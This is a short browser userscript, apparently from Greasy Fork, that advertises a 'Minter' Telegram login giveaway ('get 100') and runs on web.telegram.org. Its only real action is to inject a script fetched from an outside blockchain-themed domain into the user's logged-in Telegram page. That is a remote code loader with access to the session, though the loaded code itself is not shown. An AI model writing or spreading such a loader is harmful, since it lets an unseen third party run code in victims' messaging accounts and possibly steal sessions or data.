// ==UserScript==
// @name         Lxgn Minter Telega login get 100
// @namespace    https://web.telegram.org/
// @version      0.01
// @author       lxgn
// @description  Minter
// @match        https://web.telegram.org/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/373459/Lxgn%20Minter%20Telega%20login%20get%20100.user.js
// @updateURL https://update.greasyfork.org/scripts/373459/Lxgn%20Minter%20Telega%20login%20get%20100.meta.js
// ==/UserScript==


var ms = new Date();
//document.write();


var script = document.createElement('script');
//var t = Math.random()*1000000;

var kuda = "https://js.pro-blockchain.com/minter_telega2/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);

script.onload = function() {
    // после выполнения скрипта становится доступна функция _
    //alert( 'load script' ); // её код
  }